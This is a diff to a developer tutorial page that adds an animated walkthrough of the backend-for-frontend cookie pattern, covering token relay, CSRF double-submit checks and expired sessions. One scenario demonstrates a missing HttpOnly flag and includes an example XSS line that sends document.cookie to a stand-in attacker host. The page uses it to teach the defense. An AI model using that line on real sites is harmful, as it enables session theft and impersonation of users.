@@ -57,6 +57,13 @@
     .result.show{display:block}
     .result.safe{background:#052e16;color:#86efac;border:1px solid #134d28}
     .result.risk{background:#3b0a0a;color:#fca5a5;border:1px solid #5b1717}
+    .who-BRW{background:#3776ab;color:#fff}
+    .who-SES{background:#ffd43b;color:#3a2c00}
+    .who-CSRF{background:#a78bfa;color:#1a1030}
+    .who-RLY{background:#22d3ee;color:#04231a}
+    .who-API{background:#4ade80;color:#04231a}
+    .who-row{display:flex;flex-wrap:wrap;gap:7px;margin:14px 0 0}
+    .who-badge{font-size:11px;font-weight:700;letter-spacing:.04em;padding:3px 10px;border-radius:12px;font-family:ui-monospace,monospace}
   </style>
   <link rel="stylesheet" href="devhub.css" />
 </head>
@@ -93,6 +100,46 @@
       </div>
     </div>
     <div class="intro-ciam"><span class="tag">BFF vs bearer tokens:</span> Bearer tokens in <code>sessionStorage</code> are fine for internal/low-risk apps where you control every script on the page. BFF + httpOnly cookies is the right call for customer-facing CIAM handling PII, financial, or regulated identity data — the extra server is justified by eliminating XSS token theft.</div>
+  </div>
+
+  <!-- ── EXTREME-VIZ HERO ── -->
+  <div style="margin:0 0 28px">
+    <div class="rt-ctlbar">
+      <span class="lbl">Scenario</span>
+      <span class="userseg" id="bfSeg">
+        <button class="on" data-s="getUsers">① GET /bff/api/users — cookie in, token relayed out</button>
+        <button data-s="postProfile">② POST /bff/api/profile — CSRF token validated first</button>
+        <button data-s="expired">③ expired session — 401 before any relay is attempted</button>
+        <button data-s="noHttpOnly">④ cookie set without HttpOnly → XSS steals the session</button>
+      </span>
+      <button class="rt-run" id="bfRun">▶ Run</button>
+      <span class="rt-pill" id="bfPill">ready</span>
+    </div>
+    <div class="rt-stage">
+      <div class="rt-diagram" id="bfDiag">
+        <div class="rt-rail"></div>
+        <div class="rt-chip" id="bfChip">→</div>
+        <div class="rt-node" data-n="BRW"><span class="ic">🌐</span><div><div class="nl">Browser</div><div class="ns">sends the httpOnly cookie</div></div><span class="who who-badge who-BRW">BRW</span></div>
+        <div class="rt-node" data-n="SES"><span class="ic">🗄️</span><div><div class="nl">Session</div><div class="ns">BFF resolves stored tokens</div></div><span class="who who-badge who-SES">SES</span></div>
+        <div class="rt-node" data-n="CSRF"><span class="ic">🛡️</span><div><div class="nl">CSRF</div><div class="ns">double-submit token check</div></div><span class="who who-badge who-CSRF">CSRF</span></div>
+        <div class="rt-node" data-n="RLY"><span class="ic">🔁</span><div><div class="nl">Relay</div><div class="ns">attaches Bearer downstream</div></div><span class="who who-badge who-RLY">RLY</span></div>
+        <div class="rt-node" data-n="API"><span class="ic">✅</span><div><div class="nl">Resource API</div><div class="ns">validates JWT, responds</div></div><span class="who who-badge who-API">API</span></div>
+      </div>
+      <div class="rt-inspect" id="bfInspect">
+        <div class="rt-dir" id="bfDir">STEP 0 / 5</div>
+        <div class="rt-cap" id="bfCap">Pick a scenario and press ▶ Run</div>
+        <div class="rt-payload" id="bfPayload"></div>
+        <div class="rt-headers" id="bfHeaders"><span class="ht">INSPECTOR</span>(waiting)</div>
+      </div>
+    </div>
+    <div class="rt-result" id="bfResult"></div>
+  </div>
+  <div class="who-row">
+    <span class="who-badge who-BRW">BRW — browser sends the httpOnly cookie</span>
+    <span class="who-badge who-SES">SES — BFF resolves stored tokens</span>
+    <span class="who-badge who-CSRF">CSRF — double-submit token check</span>
+    <span class="who-badge who-RLY">RLY — Bearer attached downstream</span>
+    <span class="who-badge who-API">API — resource server validates JWT</span>
   </div>
 
   <!-- 1 -->
@@ -301,6 +348,113 @@ document.querySelectorAll('#modeseg button').forEach(b=>b.onclick=()=>{
 });
 document.getElementById('run').onclick=run;
 renderXss();
+</script>
+
+<script>
+(function(){
+  const pfx='bf';
+  const SCEN={
+    getUsers:{label:'GET /bff/api/users — cookie in, token relayed out',steps:[
+      {node:'BRW',hdr:'Browser calls GET /bff/api/users — the SESSION cookie is sent automatically (same-origin)',pay:{request:'GET /bff/api/users',cookie:'SESSION=8f3c…; HttpOnly; Secure; SameSite=Lax'},ins:'JavaScript never touches this cookie — the browser attaches it the same way it would attach any first-party cookie, without the SPA code doing anything.'},
+      {node:'SES',hdr:'BFF resolves SESSION → looks up the stored tokens server-side',pay:{sessionStore:'Spring Session + Redis',found:true,tokens:{access:'eyJ… (server-side only)',refresh:'eyJ… (server-side only)'}},ins:'The access/refresh tokens never left the server; the cookie is just an opaque key into a session store the browser cannot read.'},
+      {node:'CSRF',hdr:'GET is a "safe" method — no CSRF token required',pay:{method:'GET',csrfRequired:false},ins:'CSRF protection only needs to guard state-changing verbs (POST/PUT/PATCH/DELETE); a GET that only reads data is not a forgery target in the classic sense.'},
+      {node:'RLY',hdr:'BFF attaches the stored access token as Authorization on the downstream call',pay:{outbound:'GET https://api.internal/users',header:'Authorization: Bearer eyJ…'},ins:"This is the 'relay' in Token Relay — Spring Cloud Gateway's TokenRelay filter (or a hand-rolled interceptor) does exactly this substitution."},
+      {node:'API',hdr:'200 OK — resource server validates the JWT and runs @PreAuthorize',pay:{status:200,body:'[{"id":1,"name":"alice"}]'},tone:'ok',ins:'The BFF only protects where the token lives — the resource server still does full JWT validation and authorization on every call, exactly as if it received a direct bearer request.'},
+    ],result:{tone:'ok',text:'✅ The browser only ever sent a cookie; the access token was attached server-side and never reached JavaScript.'}},
+
+    postProfile:{label:'POST /bff/api/profile — CSRF token validated first',steps:[
+      {node:'BRW',hdr:'Browser POSTs /bff/api/profile with the session cookie AND an X-XSRF-TOKEN header',pay:{request:'POST /bff/api/profile',headers:{Cookie:'SESSION=8f3c…','X-XSRF-TOKEN':'a1b2c3d4…'}},ins:'Angular reads the (non-httpOnly) XSRF-TOKEN cookie itself and echoes its value back as a header automatically once HttpClientXsrfModule is configured.'},
+      {node:'SES',hdr:'BFF resolves the session exactly as in a GET',pay:{sessionStore:'Spring Session + Redis',found:true},ins:'Session resolution is identical regardless of HTTP verb — the branching happens next, at the CSRF check.'},
+      {node:'CSRF',hdr:'CookieCsrfTokenRepository compares the header value to the cookie value',pay:{cookieToken:'a1b2c3d4…',headerToken:'a1b2c3d4…',match:true},ins:"This is the double-submit-cookie pattern: an attacker's cross-site form can make the browser SEND the cookie, but can't read its value to also set the matching header."},
+      {node:'RLY',hdr:'CSRF passed, so the BFF proceeds to relay the access token downstream',pay:{outbound:'PATCH https://api.internal/users/me',header:'Authorization: Bearer eyJ…'},ins:'State-changing calls only ever reach the relay step after CSRF has cleared — this ordering is exactly why re-enabling CSRF matters once you introduce cookies.'},
+      {node:'API',hdr:'200 OK — profile updated',pay:{status:200,body:'{"name":"alice","updated":true}'},tone:'ok',ins:'From the resource server\'s perspective this looks like any other authorized PATCH — the CSRF defense is entirely a BFF-and-browser concern.'},
+    ],result:{tone:'ok',text:'✅ The matching XSRF-TOKEN header proved the request came from the real Angular app, not a forged cross-site form — only then was the token relayed.'}},
+
+    expired:{label:'expired session — 401 before any relay is attempted',steps:[
+      {node:'BRW',hdr:'Browser calls GET /bff/api/users with an old SESSION cookie',pay:{request:'GET /bff/api/users',cookie:'SESSION=8f3c… (issued 45 minutes ago)'},ins:'The cookie itself looks completely normal to the browser — expiry is enforced server-side, not by the cookie\'s own attributes.'},
+      {node:'SES',hdr:'BFF looks up SESSION in Redis — the TTL already expired, nothing found',pay:{sessionStore:'Spring Session + Redis',found:false},ins:'Spring Session\'s Redis-backed store expires entries via TTL; once gone, the session ID is just a random string that matches nothing.'},
+      {node:'CSRF',hdr:'N/A — the request never gets far enough to need a CSRF check',pay:{csrfChecked:false},ins:'Short-circuiting early means the BFF does the minimum work necessary before rejecting an unauthenticated call.'},
+      {node:'RLY',hdr:'N/A — the BFF never calls the downstream API at all',pay:{relayAttempted:false},ins:'No access token exists to relay in the first place — there is nothing in the (now-expired) session to read.'},
+      {node:'API',hdr:'401 Unauthorized returned directly by the BFF',pay:{status:401,source:'BFF, not the resource server'},tone:'ok',ins:"Angular's HTTP interceptor sees the 401 and redirects to /bff/login to restart the OIDC flow — the resource server was never bothered."},
+    ],result:{tone:'ok',text:'✅ An expired session is rejected at the BFF, before a single call reaches the resource server — the API and its @PreAuthorize checks never run.'}},
+
+    noHttpOnly:{label:'cookie set without HttpOnly → XSS steals the session',steps:[
+      {node:'BRW',hdr:'The session cookie was set WITHOUT the HttpOnly flag',pay:{cookie:'SESSION=8f3c…; Secure; SameSite=Lax  // ← missing HttpOnly!'},ins:'A single missing flag on one Set-Cookie header undoes the entire premise of the BFF pattern — "tokens never touch the browser" quietly becomes false.'},
+      {node:'SES',hdr:'document.cookie now exposes SESSION to any script running on the page',pay:{jsCanRead:true,call:'document.cookie  // includes "SESSION=8f3c…"'},tone:'bad',ins:'HttpOnly is the ONLY thing that makes a cookie invisible to JavaScript — Secure and SameSite protect against transport and cross-site sending, not script access.'},
+      {node:'CSRF',hdr:'An injected XSS script reads and exfiltrates the cookie value',pay:{attackerScript:'fetch("https://evil.example/steal?c="+document.cookie)'},tone:'bad',ins:'This is exactly the theft the BFF pattern exists to prevent — and exactly what a missing HttpOnly flag reopens.'},
+      {node:'RLY',hdr:'Attacker replays the stolen SESSION cookie from their own browser',pay:{attackerRequest:'GET /bff/api/users',attackerCookie:'SESSION=8f3c… (stolen)'},tone:'bad',ins:'The BFF has no way to distinguish a stolen cookie from a legitimate one — cookies are bearer credentials just like the tokens they were meant to protect.'},
+      {node:'API',hdr:"BFF finds a 'valid' session and relays the REAL access token to the attacker's request",pay:{status:200,who:"attacker, impersonating the real user"},tone:'bad',ins:'The resource server sees a perfectly normal, correctly authorized request — because from its point of view, that is exactly what it is.'},
+    ],result:{tone:'bad',text:'⚠️ Omitting HttpOnly defeats the entire point of the BFF pattern — always set HttpOnly; Secure; SameSite=Lax/Strict on the session cookie.'}},
+  };
+
+  const nodes=['BRW','SES','CSRF','RLY','API'];
+  function posOf(n){const i=nodes.indexOf(n);return i<0?50:10+i*20;}
+  let cur='getUsers',timers2=[],running2=false;
+
+  function reset2(){
+    timers2.forEach(clearTimeout);timers2=[];running2=false;
+    const pill=document.getElementById(pfx+'Pill');if(pill)pill.textContent='ready';
+    nodes.forEach(n=>{
+      const el=document.querySelector('#'+pfx+'Diag [data-n="'+n+'"]');
+      if(el)el.className=el.className.replace(/\b(cur|curbad|vchk|vskip)\b/g,'').trim();
+    });
+    const chip=document.getElementById(pfx+'Chip');
+    if(chip){chip.style.left='5%';chip.textContent='→';}
+    const dir=document.getElementById(pfx+'Dir');if(dir)dir.textContent='STEP 0 / '+SCEN[cur].steps.length;
+    const cap=document.getElementById(pfx+'Cap');if(cap)cap.textContent='Pick a scenario and press ▶ Run';
+    const pay=document.getElementById(pfx+'Payload');if(pay)pay.textContent='';
+    const hdr=document.getElementById(pfx+'Headers');if(hdr)hdr.innerHTML='<span class="ht">INSPECTOR<\/span>(waiting)';
+    const res=document.getElementById(pfx+'Result');if(res){res.textContent='';res.className='rt-result';}
+    const btn=document.getElementById(pfx+'Run');if(btn)btn.disabled=false;
+  }
+
+  function applyStep2(s,idx,total){
+    const chip=document.getElementById(pfx+'Chip');
+    if(chip){chip.style.left=posOf(s.node)+'%';chip.textContent='→';}
+    nodes.forEach(n=>{
+      const el=document.querySelector('#'+pfx+'Diag [data-n="'+n+'"]');
+      if(!el)return;
+      el.className=el.className.replace(/\b(cur|curbad|vchk|vskip)\b/g,'').trim();
+      if(n===s.node){
+        if(s.tone==='ok')el.className+=' vchk cur';
+        else if(s.tone==='bad')el.className+=' vskip curbad';
+        else el.className+=' cur';
+      }
+    });
+    const dir=document.getElementById(pfx+'Dir');if(dir)dir.textContent='STEP '+idx+' / '+total;
+    const cap=document.getElementById(pfx+'Cap');if(cap)cap.textContent=s.hdr;
+    const pay=document.getElementById(pfx+'Payload');
+    if(pay)pay.textContent=JSON.stringify(s.pay,null,2);
+    const hdrEl=document.getElementById(pfx+'Headers');
+    if(hdrEl)hdrEl.innerHTML='<span class="ht">INSPECTOR<\/span>'+s.ins;
+  }
+
+  function run2(){
+    reset2();running2=true;
+    const btn=document.getElementById(pfx+'Run');if(btn)btn.disabled=true;
+    const pill=document.getElementById(pfx+'Pill');if(pill)pill.textContent='running…';
+    const steps=SCEN[cur].steps;
+    steps.forEach((s,i)=>timers2.push(setTimeout(()=>applyStep2(s,i+1,steps.length),(i+1)*2000)));
+    timers2.push(setTimeout(()=>{
+      const r=SCEN[cur].result;
+      const res=document.getElementById(pfx+'Result');
+      if(res){res.textContent=r.text;res.className='rt-result show '+(r.tone==='ok'?'ok':'bad');}
+      if(pill)pill.textContent='done';
+      running2=false;const btn2=document.getElementById(pfx+'Run');if(btn2)btn2.disabled=false;
+    },(steps.length+1)*2000));
+  }
+
+  document.getElementById(pfx+'Run').onclick=run2;
+  document.querySelectorAll('#'+pfx+'Seg button').forEach(b=>{
+    b.onclick=()=>{
+      if(running2)return;
+      cur=b.dataset.s;
+      document.querySelectorAll('#'+pfx+'Seg button').forEach(x=>x.classList.toggle('on',x===b));
+      reset2();
+    };
+  });
+  reset2();
+})();
 </script>
 </body>
 </html>
